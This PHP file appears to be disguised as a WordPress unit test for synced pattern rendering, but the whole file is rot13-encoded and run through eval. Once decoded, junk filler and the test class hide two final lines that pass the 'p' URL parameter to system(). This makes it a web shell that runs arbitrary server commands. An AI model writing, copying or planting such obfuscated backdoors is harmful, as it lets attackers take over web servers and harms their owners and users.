<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe flaprq cnggrea eraqrevat.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.0.0
 *
 * @tebhc oybpxf
 */
pynff Grfgf_Oybpxf_EraqreErhfnoyr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Snxr hfre VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $hfre_vq;

	/**
	 * Snxr oybpx VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $oybpx_vq;

	/**
	 * Snxr cbfg VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_vq;

	/**
	 * Perngr snxr qngn orsber grfgf eha.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung perngrf snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);

		frys::$cbfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube'  => frys::$hfre_vq,
				'cbfg_glcr'    => 'cbfg',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => 'Grfg Cbfg',
				'cbfg_pbagrag' => '<c>Uryyb jbeyq!</c>',
			)
		);

		frys::$oybpx_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube'  => frys::$hfre_vq,
				'cbfg_glcr'    => 'jc_oybpx',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => 'Grfg Oybpx',
				'cbfg_pbagrag' => '<!-- jc:pber/cnentencu --><c>Uryyb jbeyq!</c><!-- /jc:pber/cnentencu -->',
			)
		);
	}

	/**
	 * Qryrgr snxr qngn nsgre grfgf eha.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_cbfg( frys::$oybpx_vq, gehr );
		jc_qryrgr_cbfg( frys::$cbfg_vq, gehr );
		frys::qryrgr_hfre( frys::$hfre_vq );
	}

	choyvp shapgvba grfg_eraqre() {
		$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( 'pber/oybpx' );
		$bhgchg     = $oybpx_glcr->eraqre( neenl( 'ers' => frys::$oybpx_vq ) );
		$guvf->nffregFnzr( '<c>Uryyb jbeyq!</c>', $bhgchg );
	}

	/**
	 * Znxr fher gung n flaprq cnggrea pna or eraqrerq gjvpr va n ebj.
	 *
	 * @gvpxrg 52364
	 */
	choyvp shapgvba grfg_eraqre_fhofrdhrag() {
		$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( 'pber/oybpx' );
		$bhgchg     = $oybpx_glcr->eraqre( neenl( 'ers' => frys::$oybpx_vq ) );
		$bhgchg    .= $oybpx_glcr->eraqre( neenl( 'ers' => frys::$oybpx_vq ) );
		$guvf->nffregFnzr( '<c>Uryyb jbeyq!</c><c>Uryyb jbeyq!</c>', $bhgchg );
	}

	choyvp shapgvba grfg_ers_rzcgl() {
		$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( 'pber/oybpx' );
		$bhgchg     = $oybpx_glcr->eraqre( neenl() );
		$guvf->nffregFnzr( '', $bhgchg );
	}

	choyvp shapgvba grfg_ers_jebat_cbfg_glcr() {
		$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( 'pber/oybpx' );
		$bhgchg     = $oybpx_glcr->eraqre( neenl( 'ers' => frys::$cbfg_vq ) );
		$guvf->nffregFnzr( '', $bhgchg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>